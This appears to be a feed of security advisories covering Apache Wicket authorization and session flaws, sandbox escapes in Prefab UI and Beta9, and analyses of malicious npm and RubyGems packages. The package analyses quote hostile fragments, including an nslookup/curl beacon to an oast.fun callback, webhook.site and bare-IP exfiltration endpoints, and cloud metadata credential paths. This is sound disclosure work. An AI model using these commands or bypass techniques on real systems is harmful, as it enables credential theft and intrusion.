advisories.summary:
Incorrect order of security checks in Apache Wicket.

org.apache.wicket.protocol.http...
advisories.description:
Incorrect order of security checks in Apache Wicket.

org.apache.wicket.protocol.http.ResourceIsolationRequestCycleListener obtains the page a request targets before it consults its resource isolation policies, because those policies are passed that page. Obtaining the page instantiates it, and instantiating a page runs the configured org.apache.wicket.authorization.IAuthorizationStrategy. An application that refuses an unauthenticated visitor by throwing org.apache.wicket.RestartResponseAtInterceptPageException therefore throws it from inside the isolation listener, before any policy has run. That exception replaces the request handler, so the policies are never consulted and a request that came from another origin is not refused.

The exception's constructor stores the URL of the request it interrupted, so that Component#continueToOriginalDestination() can resume it once the visitor has signed in. The stored URL is the one the policies would have refused. On sign in Wicket redirects to it, and that redirect is same-origin, so the policies allow it and the listener runs in the newly authenticated session. The whole URL is stored, its query string included, so an ordinary org.apache.wicket.markup.html.form.Form is resumed with the field values the original request carried in its query string and Form#onSubmit() runs with values another origin chose. A form POST is not needed for this; a plain top-level navigation carries them.

An application is affected where it registers ResourceIsolationRequestCycleListener, which is opt-in and is not registered by default, and where it refuses unauthorized access with RestartResponseAtInterceptPageException followed by continueToOriginalDestination(). No application override is involved on that path: IAuthorizationStrategy#isInstantiationAuthorized() documents throwing that exception, org.apache.wicket.authroles.authentication.AuthenticatedWebApplication throws it and org.apache.wicket.authroles.authentication.panel.UsernamePasswordPanel continues to the original destination, and org.apache.wicket.authorization.strategies.page.SimplePageAuthorizationStrategy in wicket-core installs the same pattern. A visitor who is already signed in is not affected, because no interception occurs. Request-body parameters stored alongside the intercepted URL are not applied to the resumed form: the resumption is a redirect, so the resumed request is a GET, and form components read their values from the query string on a GET.

As a workaround, refuse unauthorized access with org.apache.wicket.RestartResponseException instead, which does not store the original destination; visitors are then not returned to the page they asked for after signing in.

This issue affects Apache Wicket: from 9.1.0 through 9.24.0, from 10.0.0 through 10.11.0.

Releases before 9.1.0, which is every 8.x release and 9.0.0, are not affected, because the resource isolation this issue concerns was introduced in 9.1.0. They are not protected either. Their only cross-origin defence is org.apache.wicket.protocol.http.CsrfPreventionRequestCycleListener, which works out where a request came from by reading its Origin header and falling back to its Referer header. Neither header need arrive: a browser does not send Origin on the plain GET a link uses, and the document on the other origin decides through its own referrer policy whether a Referer reaches the application at all. That mechanism therefore never made the guarantee the Fetch Metadata based policy makes, and on those releases a listener invocation from another origin is not reliably refused in the first place. Anyone on a release before 9.1.0 who wants this protection should upgrade to 9.x or 10.x and register ResourceIsolationRequestCycleListener.

Users are recommended to upgrade to version 9.25.0 or 10.12.0, which fix the issue.

advisories.summary:
Missing authorization in Apache Wicket.

org.apache.wicket.authorization.IAuthorizationStrategy...
advisories.description:
Missing authorization in Apache Wicket.

org.apache.wicket.authorization.IAuthorizationStrategy declares isResourceAuthorized(), and that method has a single enforcement point in the framework: org.apache.wicket.request.handler.resource.ResourceRequestHandler, the handler that serves a resource reached through a mounted or shared ResourceReference. Components that are handed an org.apache.wicket.request.resource.IResource instance instead call IResource#respond() themselves from their own request listener and never construct that handler. In wicket-core these are org.apache.wicket.markup.html.link.ResourceLink, org.apache.wicket.markup.html.image.Image and org.apache.wicket.markup.html.form.ImageButton; in wicket-extensions it is org.apache.wicket.extensions.ajax.AjaxDownloadBehavior. A resource restricted by a custom isResourceAuthorized() implementation, or by an @AuthorizeResource annotation from wicket-auth-roles, is therefore enforced when it is requested through its own resource URL and is not enforced when the same instance is served through the component that holds it.

Which of the two happens is decided by the constructor the application used, and not by anything the application can see in the rendered page. ResourceLink(String, ResourceReference) renders a resource URL and the request is authorized; ResourceLink(String, IResource) renders a component listener URL and it is not. Image, ImageButton and AjaxDownloadBehavior each offer the same pair of constructors and behave the same way. Image and ImageButton write that listener URL into the src attribute of the tag they render, so a browser requests it without any action by the user, and the resource an Image serves may also come from the component's model.

An application is affected where it restricts a resource through IAuthorizationStrategy#isResourceAuthorized() or an @AuthorizeResource annotation and then hands that same resource to one of those components as an IResource. An application that does not restrict resources at all is not affected, and neither is a resource that is only mounted or registered as a shared resource. The pattern does not have to be written by the application itself: org.apache.wicket.extensions.markup.html.repeater.data.table.export.ExportToolbar builds each of its export links from an IResource instance, so the exported contents of a data table are served without the resource check in any application that adds that toolbar.

As a workaround, register the resource in the application's shared resources and pass the resulting ResourceReference to the component instead of the IResource, so that the request is routed through the handler that consults the authorization strategy.

This issue affects Apache Wicket: from 8.0.0 through 8.19.0, from 9.0.0 through 9.24.0, from 10.0.0 through 10.11.0. Users are recommended to upgrade to version 8.20.0, 9.25.0 or 10.12.0, which fix the issue.

advisories.summary:
Missing authorization in Apache Wicket.

org.apache.wicket.core.request.handler...
advisories.description:
Missing authorization in Apache Wicket.

org.apache.wicket.core.request.handler.ListenerRequestHandler invokes an IRequestListener only when org.apache.wicket.Component#canCallListener() allows it, and that method is isEnabledInHierarchy() && isVisibleInHierarchy(). The visibility half reads a flag that carries the outcome of IAuthorizationStrategy#isActionAuthorized() for the Component.RENDER action, and that flag is written in one place only, Component#configure(), during the render phase. A listener URL built by a subclass of org.apache.wicket.core.request.mapper.AbstractBookmarkableMapper carries the page identifier and the component path in a single parameter, and the page identifier may be empty. When it is, a new page instance is constructed, PageProvider#wasExpired() is false because no identifier was supplied, and PageAndComponentProvider#getComponent() finds the component directly on the new instance, so neither a render pass nor Component#configure() runs before the listener is invoked. The flag therefore still holds its constructor default, the component counts as visible, and the listener of a component the authorization strategy denied RENDER for is executed. The same request also skips Component#onConfigure(), so visibility and enablement an application sets there are not applied either.

There are two ways to reach this, and neither requires anything but a request. On a page that is stateful, the caller omits the page identifier from a listener URL that would otherwise carry it. On a page that Wicket considers stateless, nothing has to be altered at all: Wicket itself writes listener URLs without a page identifier for such pages, and a component the strategy denies RENDER for is treated as stateless and therefore does not keep the page stateful, so denying RENDER can itself produce the page-id-less form. The second route has never been refused. The ENABLE decision of IAuthorizationStrategy is consulted on every invocation and still refuses, as does a request that supplies the real identifier of a page instance that has already been rendered; a component the application disabled in Component#onConfigure() is protected by neither, because that callback has not run.

An application is affected where it withholds an individual component from the caller, either by denying the RENDER action through IAuthorizationStrategy, including through the MetaDataRoleAuthorizationStrategy and AuthorizeAction facilities of wicket-auth-roles, or by setting the component's visibility or enabled flag in Component#onConfigure(), the callback Wicket's own documentation directs applications to use for both. The page carrying such a component has to be constructible from a bookmarkable or mounted URL, which requires a public constructor taking either no arguments or a PageParameters argument. Behaviours pass through the same gate, so an AJAX behaviour attached to such a component is equally exposed. Separately, and whether or not any component is withheld, a listener on a page Wicket considers stateful is invoked on an instance the request itself constructed, so it acts on models built from page parameters the caller supplied rather than on the state the application last rendered. Instantiation authorization is unaffected: IAuthorizationStrategy#isInstantiationAuthorized() is still consulted when the new page instance is created, so a guard placed on the page rather than on the individual component continues to hold.

This issue affects Apache Wicket: from 8.0.0 through 8.19.0, from 9.0.0 through 9.24.0, from 10.0.0 through 10.11.0. Users are recommended to upgrade to version 8.20.0, 9.25.0 or 10.12.0, which fix the issue.

advisories.summary:
Insufficient session expiration in Apache Wicket.

org.apache.wicket.protocol.ws...
advisories.description:
Insufficient session expiration in Apache Wicket.

org.apache.wicket.protocol.ws.WebSocketSettings#newWebSocketRequest() wraps the WebSocket upgrade request in an org.apache.wicket.protocol.ws.api.ServletRequestCopy, which is kept for the life of the connection and used to build the request for every frame that arrives on it. Copying the request is deliberate and is documented as such, because the container recycles the upgrade request once the handshake is over. The container session is copied along with it, into an org.apache.wicket.protocol.ws.api.HttpSessionCopy holding the session attributes as they stood when the connection was opened. That second copy is not necessary, because a session, unlike a request, is not discarded at the end of a request. Every frame afterwards resolves its Wicket session through ISessionStore#lookup(), which reads it out of the copy, so the connection is detached from the live container session for as long as it stays open.

Ending the session through the container therefore does not end the connection. After an idle timeout, an HttpSession#invalidate() call made from a filter or from a security framework, a container-managed logout, or a session replacement, the connection goes on resolving the org.apache.wicket.Session instance that existed when it was opened, together with that session's attributes and, for applications built on wicket-auth-roles, the signed-in state held on that same instance, so an authorization decision taken inside a WebSocket callback is taken against an identity that has already been revoked. The copy is also what the connection writes through: a Session#invalidateNow() issued from inside a WebSocket callback invalidates the copy and leaves the container session valid, and session attributes set over the connection are written to the copy rather than to the session.

An application is affected where it uses Wicket's native WebSocket support on pages or shared resources that require an authenticated session, and where sessions are ended by the container rather than by Wicket. Session#invalidateNow(), and AuthenticatedWebSession#invalidate() and #signOut() which call it, remain effective for a WebSocketBehavior on a page: they clear the page manager, and the connection can then no longer resolve the page it was opened for. A WebSocketResource is not limited in that way, because a frame naming a resource is served against a throwaway page and never consults the page manager, so such a connection outlives Wicket's own sign-out as well. Some containers close WebSocket connections themselves when the HTTP session they were opened under is destroyed, in which case the connection ends regardless; that is a property of the container rather than of Wicket. Applications that do not use the native WebSocket support are not affected.

This issue affects Apache Wicket: from 8.0.0 through 8.19.0, from 9.0.0 through 9.24.0, from 10.0.0 through 10.11.0. Older, unsupported releases from 6.0.0 onwards are also affected. Users are recommended to upgrade to version 8.20.0, 9.25.0 or 10.12.0, which fix the issue.

advisories.summary:
Missing authorization in Apache Wicket.

org.apache.wicket.protocol.ws.api.WebSocketBehavior,...
advisories.description:
Missing authorization in Apache Wicket.

org.apache.wicket.protocol.ws.api.WebSocketBehavior, through which Wicket's native WebSocket support hands a message sent by the client to the application, calls its onMessage() callbacks without checking whether the client may invoke the component the behavior is attached to. Wicket opens a single WebSocket connection per page, and a message received on it is delivered to every WebSocketBehavior of that page. For an Ajax behavior Wicket makes this check before invoking it, through Behavior#canCallListener(Component), which refuses a component that is not visible or not enabled, including one for which the IAuthorizationStrategy denies the RENDER or ENABLE action. A WebSocketBehavior attached to such a component, or to a child of one, therefore receives the client's text and binary messages, together with a WebSocketRequestHandler that writes back to that client, where an Ajax behavior on the same component would be refused.

An application is affected where it attaches a WebSocketBehavior that overrides onMessage() to a component that it hides, disables, or restricts through its IAuthorizationStrategy, for example with MetaDataRoleAuthorizationStrategy or the AuthorizeAction annotation. The client needs a session of their own and a page of their own that contains such a component: messages are delivered only to pages in the page store of the client's own session, so this gives no access to another user's session, page or connection. Messages pushed by the server are not affected.

This issue affects Apache Wicket: from 8.0.0 through 8.19.0, from 9.0.0 through 9.24.0, from 10.0.0 through 10.11.0. Older, unsupported releases from 6.0.0 onwards are also affected. Users are recommended to upgrade to version 8.20.0, 9.25.0 or 10.12.0, which fix the issue.

advisories.summary:
Missing authorization in Apache Wicket.

org.apache.wicket.protocol.ws.api...
advisories.description:
Missing authorization in Apache Wicket.

org.apache.wicket.protocol.ws.api.WebSocketMessageBroadcastHandler, the request handler Wicket's native WebSocket support uses to deliver an incoming frame, resolves the shared resource named by the client's handshake parameter and calls WebSocketResource#onPayload() on it directly, without consulting IAuthorizationStrategy#isResourceAuthorized(). That method has a single enforcement point in the framework, org.apache.wicket.request.handler.resource.ResourceRequestHandler, which the WebSocket transport does not pass through, and WebSocketResource#respond() is final and empty. No route to a WebSocketResource therefore asks the configured authorization strategy whether the caller may use it, and an @AuthorizeResource annotation on such a class has no effect.

A caller needs a bound Wicket session and the name of the resource. The name is not a secret: Wicket writes it into the page that opens the connection. No page of the application is otherwise involved, because a request naming a resource is served with a throwaway page. All of the resource's callbacks are reached this way, including onConnect() and both onMessage() overloads, and what a callback pushes back through WebSocketRequestHandler goes to the caller's own connection.

An application is affected where it registers a WebSocketResource as a shared resource and relies on the authorization strategy to restrict it. What the caller gains is whatever that resource's callbacks do with a text or binary message of the caller's choosing. The connection is registered under the caller's own session, so it gives no access to another user's connection.

As a workaround, reject unauthorized connections with an IWebSocketConnectionFilter registered through WebSocketSettings#setConnectionFilter(), or repeat the authorization check at the start of each callback.

This issue affects Apache Wicket: from 8.0.0 through 8.19.0, from 9.0.0 through 9.24.0, from 10.0.0 through 10.11.0. Older, unsupported releases from 7.0.0 onwards are also affected. Users are recommended to upgrade to version 8.20.0, 9.25.0 or 10.12.0, which fix the issue.

advisories.summary:
Missing authorization in Apache Wicket.

org.apache.wicket.markup.html.form.Form resolves the...
advisories.description:
Missing authorization in Apache Wicket.

org.apache.wicket.markup.html.form.Form resolves the component that submitted a form from the request parameters in Form#onRequest() and passes the result directly to Form#onFormSubmitted(IFormSubmitter). The check that the submitting component is visible and enabled in its hierarchy runs only when onFormSubmitted() is given no submitter, so it no longer runs for an ordinary form submission, and it is the only point at which Wicket verifies that the application actually offered the named control to the caller. Form#findSubmitter() matches on the request parameter name alone and applies no visibility or enablement filter, and the request handler checks only the form itself, which is visible and enabled. A request that names a submit button the application withheld therefore reaches that button's onSubmit() and onAfterSubmit(), and its onError() when form validation fails; where the button sets setDefaultFormProcessing(false) it reaches onSubmit() and onAfterSubmit() without any form validation.

An application is affected where a form submitting component, such as a Button or a SubmitLink, is unavailable to the caller while the enclosing form remains available. How the component was made unavailable does not matter: the component's own setVisible(false), setEnabled(false) or setVisibilityAllowed(false), an overridden isVisible() or isEnabled(), an invisible or disabled parent container anywhere above it, and a RENDER or ENABLE denial from IAuthorizationStrategy — for example through MetaDataRoleAuthorizationStrategy or the AuthorizeAction annotation — are all enforced by that one check, and all of them are bypassed. A component that renders as disabled carries its own input name in the markup the caller already holds. Submissions made through AjaxFormSubmitBehavior, and therefore through AjaxButton and AjaxSubmitLink, are not affected: those are invoked as a behaviour on the button itself, the behaviour's invocation is authorized against that button, and the non-Ajax callbacks of those two classes do nothing. Restrictions applied to the form or to the page rather than to the submitting component are unaffected.

The 9.x and 8.x release lines, and the unsupported lines before them, are not affected; the behaviour was introduced in 10.3.0.

This issue affects Apache Wicket: from 10.3.0 through 10.11.0. Users are recommended to upgrade to version 10.12.0, which fixes the issue.

advisories.description:
HTTP::Session versions before 0.54 for Perl allow memcached command injection via unfiltered session ids in HTTP::Session::Store::CHI.

The session id from the client's cookie reaches the CHI cache unchanged. The sibling HTTP::Session::Store::Memcached rejects ids that contain control characters, but the CHI store has no such check, and CHI does not escape keys for its memcached drivers.

With a memcached driver, a CR and LF in the session id end the cache command early, and the server reads the bytes after them as further commands.

advisories.summary: Prefab UI's Generative UI sandbox runs caller-supplied Python inside Pyodide, Python compiled to...
advisories.description: Prefab UI's Generative UI sandbox runs caller-supplied Python inside Pyodide, Python compiled to WebAssembly, in a Deno subprocess. The feature is documented as isolation for untrusted code, including LLM-written UI. From prefab-ui 0.14.0 through 0.20.2 the launcher starts Deno with unrestricted --allow-read, --allow-write, and --allow-net, and the runner leaves the Deno API on the JavaScript global object. Pyodide's js module proxies that global, so the Python can call Deno.readTextFileSync and Deno.writeTextFileSync. A caller who can supply the code can read and write files as the server OS user, and can persist code execution by writing a .pth file into the server virtualenv's site-packages. The usual remote path is FastMCP's GenerativeUI provider, which registers the MCP tool generate_prefab_ui and forwards that tool's code argument into this sandbox. On a FastMCP server with no authentication configured, any client who can reach the server can call the tool. With authentication, any client allowed to call tools can. Generative UI is opt-in, and the host must have Deno installed. Confirmed on prefab-ui 0.20.2. Fixed in 0.21.0: after the runtime and Prefab sources load, the runner revokes Deno read, write, and network permission before it accepts code, the process is started with --no-prompt so a permission request cannot grant them again, and bootstrap network access is limited to cdn.jsdelivr.net. The fix is commit 030f074 (pull request 538).

advisories.summary: A Beta9 tenant can attach a volume when deploying a function, endpoint, or task queue. The...
advisories.description: A Beta9 tenant can attach a volume when deploying a function, endpoint, or task queue. The gateway builds the host path by joining the shared volumes root, the workspace name, and the volume identifier from the stub configuration. Nothing checks that the identifier names a volume that workspace owns. Parent-directory segments in the identifier collapse the joined path to the worker's filesystem root, and the worker bind-mounts that path into the sandbox read-write unless the volume was explicitly marked read-only. A tenant with a workspace token can therefore read and write the worker's files, including other tenants' volumes stored on that machine. Confirmed against gateway 0.1.769 and worker 0.1.745. Fixed in gateway 0.1.776 and worker 0.1.756: volume identifiers and mount paths are validated before a mount is built, including for stubs saved before the check existed, and the gateway rejects a volume that does not exist or is not owned by the workspace.

advisories.summary: Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and...
advisories.description: Beta9 turns each shell command in a tenant image definition into a Dockerfile RUN line and executes it with Buildah on the build worker. The worker image sets BUILDAH_ISOLATION=chroot, and no buildah invocation passes --isolation, so the step only changes its filesystem root. It keeps the worker pod's PID, network, IPC, and user namespaces, runs as uid 0, and holds CAP_DAC_OVERRIDE. PID 1 in that procfs is the worker entrypoint, so /proc/1/root is the worker container's filesystem and is writable. That filesystem contains the runc, buildah, and runsc binaries the worker uses to start tenant containers, the worker's Kubernetes service account token, and the host directories mounted into the pod. Worker pods are privileged. Clip v2 layered builds are the default, so a tenant with a workspace token reaches this by submitting one image build. The read-only proof confirmed the shared namespaces, CAP_DAC_OVERRIDE, and that the worker's runc binary is visible at /proc/1/root. Fixed in worker 0.1.756: Buildah RUN steps, including the WORKDIR mkdir, use OCI isolation with private PID, IPC, and network namespaces, and tenant ARG values are passed only into the build container.

advisories.summary: The Beta9 worker serves the sandbox file API from outside the container....
advisories.description: The Beta9 worker serves the sandbox file API from outside the container. getHostPathFromContainerPath turns the tenant's container path into a worker path. If the unresolved path starts with a mount destination, including the default upload mount at /tmp/.beta9, the remainder is joined onto that mount's source with filepath.Join, which cleans parent-directory segments after the prefix check. A long enough run of those segments names any absolute path on the worker. A path that matches no mount is joined onto the container root and opened in the worker's own filesystem, so an absolute symbolic link such as /var/run pointing at /run is followed against the worker root. Upload, download, stat, list, find-in-files, replace-in-files, and delete-file all call this helper. A tenant with a workspace token and one running sandbox can read, write, list, and delete files on the hosting worker as root, including files of other tenants on that machine. A read-only proof downloaded the worker pod's Kubernetes service account token through the file API for a path that did not exist inside the sandbox. In the shipped remote-node manifests that service account is bound to cluster-admin. Fixed in worker 0.1.756: sandbox file operations and workspace sync open paths with os.OpenRoot, so parent-directory and symlink lookups stay inside the container root or the mount source.

advisories.summary: Malicious code in @goparrot-dashboard/store (npm)
Malicious code in @goparrot-dashboard/promotion (npm)
Malicious code in @atedone/workspace-context (npm)
advisories.description:
## Source: amazon-inspector (831ecc7c41217227ee159b85e4510e3d58c956be016bd7582e94fefb011565fe)
On require(), the package's top-level state.initialize() writes shell integration files into ~/.config/workspace-context (init.zsh,.zshrc, session-runtime.js, presentation.js, channel.json) and spawns a detached, unref'd Node worker that launches `/bin/zsh -i` with ZDOTDIR pointed at that directory. The injected init.zsh installs a zsh precmd hook that re-executes a sibling script on every prompt, giving a persistent shell foothold triggered by merely importing the module. session.js fetches http://150.136.8.159:8080/workspace/profile over plaintext HTTP from a hardcoded bare IP, appending?username=<USER> read from env.USER/LOGNAME, writes the response to session-profile.json, and presentation.js injects fields from that remote JSON directly into the user's live zsh PROMPT via %F{tone}text%f substitution — remote attacker-controlled content is rendered through zsh prompt expansion on every command. Sensitive API names are reassembled at runtime from string fragments to defeat static analysis: ['bin','ding'].join(''), ['sp','awn','_','sync'].join(''), ['sp','awn'].join(''), ['child','_process'].join(''), ['fe','tch'].join(''), and the env-var name ['WORKSPACE','_CONTEXT','_CHANNEL'].join(''). Access to child_process/fetch is funneled through Reflect.get/Reflect.apply with no plain literal references anywhere. refreshShellIntegration obtains the internal process.binding('spawn_sync') handle to execute `node lib/sync.js`, bypassing the public child_process module. The package has no legitimate need, consistent with its stated purpose, to spawn an interactive shell at import time, hook zsh precmd, or fetch remote content from a bare IP over cleartext HTTP.

Malicious code in @goparrot-dashboard/app (npm)
advisories.description:
@goparrot-dashboard/app is a dependency-confusion probe: it takes a name in a `@goparrot-dashboard` scope that its publisher created on npm, next to GoParrot's public `@goparrot` scope, so a build that resolves that scope from npm runs its code instead of a private package of the same name. In 0.0.2 a preinstall script runs `node index.js` on npm install, which collects the hostname, the `whoami` user and the working directory, looks up a DNS name built from the user and host names under `iuczektmwpudhwqnsbkgc6m8nx2dgn5vc.oast.fun` with `nslookup`, and sends the same values in a `curl` request to `https://iuczektmwpudhwqnsbkgc6m8nx2dgn5vc.oast.fun/rootxravi-poc`, an interactsh callback host; 0.0.1 and 0.0.3 only print a marker when imported. The npm account devtest91001 published it on 2026-11-01 together with 24 other `@goparrot-dashboard` and `@goparrot-dashboard-api` packages that print the same "rootxravi-poc-security" marker.## Source: amazon-inspector (15fc3978543eda6ea8e55289945a35f5244e9a6bd47959bee908ab293cdfd658)
The package declares a `preinstall` lifecycle script that runs `node index.js` automatically on `npm install`. index.js collects installer host identifiers — `hostname`, the output of `whoami`, and `process.cwd()` — and transmits them to a hardcoded Interactsh (oast.fun) callback host at `iuczektmwpudhwqnsbkgc6m8nx2dgn5vc.oast.fun` via two channels: a DNS lookup against a subdomain that embeds the collected username and hostname (`execSync("nslookup ${whoami}.${hostname}.rootxravi.${CALLBACK}")`), and an HTTPS GET to `https://<CALLBACK>/rootxravi-poc?...` carrying the same data. The behavior fires without user action during installation and leaks identifying information about the installer's machine to an attacker-controlled OAST endpoint. Author comments labeling the code as a proof-of-concept do not change the dataflow — installing the package produces an install-time beacon to a third-party callback host.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/99e73763c6c2a260364e25a118e54666cdb432f8/osv/malicious/npm/@goparrot-dashboard/app/MAL-2026-18492.json))

Malicious code in spectral-core (npm)
advisories.description:
## Source: amazon-inspector (451c36f03e81be0ff6c85334587d7ff401de1e5134e179557ec4bc454cd7ba76)
The tarball ships only package.json and binding.gyp (plus a markdown file), with gypfile: true set in package.json so npm invokes node-gyp rebuild on install. binding.gyp declares a 'none'-type target with no native source files; its sole purpose is an inline action that runs `node -e` with an embedded script. At install time that script reads /proc/1/environ and /proc/self/environ (container/pod entrypoint environment variables, which routinely contain CI/CD secrets and cloud credentials), collects DNS/socket/ARP/route reconnaissance output, queries the AWS EC2 instance metadata service at 169.254.169.254 for user-data and meta-data, and POSTs the collected data to the hardcoded collector https://webhook.site/d6092bdc-05c0-45da-a280-c343ea6d6156. The package exposes no library functionality — main: index.js is declared but index.js is not shipped — so the binding.gyp exists solely as a vehicle for install-time code execution and credential exfiltration. The name resembles the legitimate @stoplight/spectral-core project but the shipped contents are unrelated to it.

advisories.description:
## Source: amazon-inspector (7e3ba0508c4009825b9eb3d248094ccbf28b2a2b4dcec420d1aaa533c1594729)
package.json aliases the import name 'libsignal' to the third-party npm package '@bellaxchuu/libsignal-node' pinned only to the mutable '@latest' dist-tag: "libsignal": "npm:@bellaxchuu/libsignal-node@latest". The code imports 'libsignal' at module load time for end-to-end-encryption primitives (SessionCipher, SessionRecord, ProtocolAddress, SessionBuilder in lib/Signal/libsignal.js and lib/Signal/curve.js). Each install resolves whatever the owner of @bellaxchuu/libsignal-node has published to @latest, with no version pin, no integrity check, and no provenance tie to the upstream libsignal-node project. The maintainer of the aliased fork therefore controls arbitrary code that runs at require/import time of this package, including inside the cryptographic session-handling path.

advisories.summary: Malicious code in dopc-client (RubyGems)
advisories.description:
## Source: amazon-inspector (0ecbe68fef68472dcc1e9778859b71dcba31c06e8db799d75bb95c013f6ab1da)
On `require 'dopc-client'`, lib/dopc-client.rb issues a plaintext HTTP GET to the hardcoded bare IP 38.242.235.206 at path /depconf/dopc-client/require with query parameters carrying the installer's OS username (ENV['USER']), hostname (Socket.gethostname), and current working directory (Dir.pwd). The call fires as a top-level side effect of loading the gem, errors are swallowed, and the destination is a plaintext bare IP unrelated to any declared publisher infrastructure. Inline comments and the gemspec description frame the call as a 'benign beacon' / 'defensive placeholder'; the author-controlled self-label does not change the observed behavior — installer-identifying fields are shipped to a third-party endpoint the caller did not configure or opt into.

## Source: amazon-inspector (28b6b5c8c100680386dbcbbd51dd409f67f0d54701eb0e50232934acc53bf397)
The package's binding.gyp contains a GYP command-expansion action that is executed automatically by node-gyp during `npm install`. The embedded `node -e` script runs `grep -rl 'HTB{' /workspace/ /root/ /tmp/ /opt/ /var/ /etc/` across installer-side paths, reads /tmp/scent-trail.jsonl and /workspace/repo/package.json, enumerates every key of process.env and concatenates each key=value pair, and POSTs each of these payloads (prefixed GREP:, FILE:, ALLENV:) to the hardcoded attacker endpoint webhook.site/89bd8fe7-328c-4e6d-970c-4d567b5a48a0. The binding.gyp has no accompanying native source files; its only purpose is to run the embedded exfiltration command. The implausibly high version string (99999.0.1) is consistent with a dependency-confusion lure. Installing this package in a developer workstation or CI environment causes CI secrets, API tokens, and environment-injected credentials, along with workspace file contents and any file containing the HTB{ marker, to be transmitted to an attacker-controlled host.

advisories.description:
## Source: amazon-inspector (2999c5d0dd2a35fe1dfb6bdc17da36aaed07d4f6fa7e10f9f395a4b39d1c7265)
@ifasn/mmdd-doc-mcp advertises itself as a Markdown TOC/stats/table MCP server, but on startup (bin entry / `npm start`) its index.js performs an unsolicited IMDSv2 handshake against the Alibaba Cloud ECS metadata endpoint 100.100.100.200: a PUT to /latest/api/token with X-aliyun-ecs-metadata-token-ttl-seconds followed by a GET to /latest/meta-data/ram/security-credentials/, retrieving the host instance's RAM temporary security credentials and other metadata. The response is written to output/meta_v2_dump.txt in the current working directory. The behavior is unrelated to any Markdown processing. The published tarball also ships patch scripts (patch111.js, patch112.js) that enumerate additional host secret paths — /etc/shadow, /etc/passwd, /root/.ssh/id_rsa, /var/www/html/.env, and the Kubernetes service-account token at /var/run/secrets/kubernetes.io/serviceaccount/token — with preview labels SENSITIVE-FILE / SHADOW-ENTRIES / TOKEN-LENGTH, and output/meta_field_dump.txt confirms those host-path probes were previously executed. A code comment claiming '无网络上报' (no network reporting) and the 'v2 probe edition' framing are cover-story labels; the operation is unauthorized reading of installer-side cloud instance-role credentials by a package whose declared purpose does not require any host metadata access.

advisories.summary: Malicious code in @ifasn/mmd-doc-mcp (npm)
advisories.description:
## Source: amazon-inspector (e3b58b8adeff2784f4fdeb4bf0e873e5797893619b3bc36c55de55b85efca1b7)
On startup, bin/main probes cloud instance-metadata endpoints for AWS (including the IMDSv2 token path), GCP, Azure, and Alibaba (including the RAM `security-credentials/` role path) under variables named `HEALTH_PROBES`/`CONFIG_NODES`, then transmits the aggregated per-endpoint HTTP status codes to a hardcoded author-controlled destination via `pingTelemetry("?stage=report&src=mmd-doc-mcp&nodes=" + results.join(","))` to `TELEMETRY_HOSTS = ["http://121.199.24.94.nip.io", "http://121.199.24.94"]`. The returned status-code pattern uniquely identifies the installer's cloud provider and whether an attached IAM/RAM role is present. The package advertises itself as a markdown table-of-contents MCP server, a purpose that has no need to probe cloud credential metadata services. Code comments and identifiers (`configSync`, 'enterprise intranet config sync node', '健康检查只记录状态码，不收集文档内容') frame the reconnaissance as benign configuration synchronization; the probed URLs are canonical cloud IMDS/credential endpoints, not any configuration service. Traffic also uses plaintext HTTP to a bare IP wrapped in nip.io to avoid DNS registration.

advisories.summary: Malicious code in @ifasn/mdd-doc-mcp (npm)
advisories.description:
## Source: amazon-inspector (1d8295dd6d1f932aa9f2b865822f1a6f213e00fc288b35cd4b7d8fa0f07a8641)
On load, index.js queries the Alibaba Cloud ECS instance metadata service at 100.100.100.200, performs the IMDSv2-style PUT to obtain a metadata token (X-aliyun-ecs-metadata-token), then reads a base64-concealed path that decodes to `ram/security-credentials/` — the IMDS endpoint that returns STS AccessKeyId/Secret/SecurityToken for the instance's RAM role — and writes the response to `output/meta_field_dump.txt`. The surrounding code frames the operation as benign `field map v2` diagnostics and leaves all other metadata field names (hostname, image-id, zone-id, instance-id, owner-account-id) in cleartext while encoding only the credentials path, which is a cover-story pattern. The package's declared purpose is a Markdown documentation MCP tool and has no legitimate need for cloud instance role credentials. Separately, package.json pins the dependency `node-health-utils` to a plain-HTTP tarball at the bare IP `http://121.199.24.94/dl/health-utils-1.0.0.tgz` — on `npm install` this fetches and installs whatever bytes that host returns, unpinned, with no integrity check and no TLS, and runs any lifecycle scripts contained in the fetched tarball. The combination gives the publisher both install-time code execution on every installer and, on cloud-hosted installs, theft of the instance's STS credentials.

advisories.summary: Malicious code in @ifasn/md-doc-mcp (npm)
advisories.description:
## Source: amazon-inspector (808d25733e867c0cb6808f89bbed4cc90e8362b1e1a2e52759676d51bd0273bb)
The package is advertised as a markdown toolkit MCP server (TOC generation, word count, table formatting) but on require() of its main module and on startup of its md-doc-mcp bin it probes cloud-provider instance-metadata services — AWS IMDSv1/v2 (169.254.169.254), GCP, Azure, and Alibaba Cloud (100.100.100.200) — and sends the per-endpoint responses as query-string parameters over plain HTTP to a hardcoded external host 121.199.24.94, reached both as a bare IP and via the nip.io wildcard-DNS alias 121.199.24.94.nip.io. The outbound request is shaped as `?stage=report&src=md-doc-mcp&nodes=<results>`. Source-level naming (`CONFIG_NODES`, `HEALTH_PROBES`, `pingTelemetry`) and Chinese-language comments describing the behavior as enterprise configuration sync and a status-code-only usage ping do not match the actual URLs probed or the destination contacted; IMDS endpoints are not configuration services, and the destination is an unrelated third-party IP rather than any first-party publisher infrastructure. The combination of cloud-metadata enumeration unrelated to the package's declared purpose, plaintext HTTP exfiltration to a bare-IP host disguised through nip.io, and automatic execution on import/startup identifies installers' cloud environments to a third party and provides reconnaissance for follow-on cloud-credential or instance attacks.

---

Credit: [OpenSSF](https://github.com/ossf/malicious-packages) ([source](https://github.com/ossf/malicious-packages/blob/cdd9fc0c28c93bd1d9e884a6f8f56001207a6773/osv/malicious/npm/@ifasn/md-doc-mcp/MAL-2026-18486.json))

advisories.summary: Malicious code in @bananacool467/ui-tools (npm)
advisories.description:
## Source: amazon-inspector (b8497bfe55fd379ac7c87c73e99e8c532193a17516996d9ae6cfb856b84a052a)
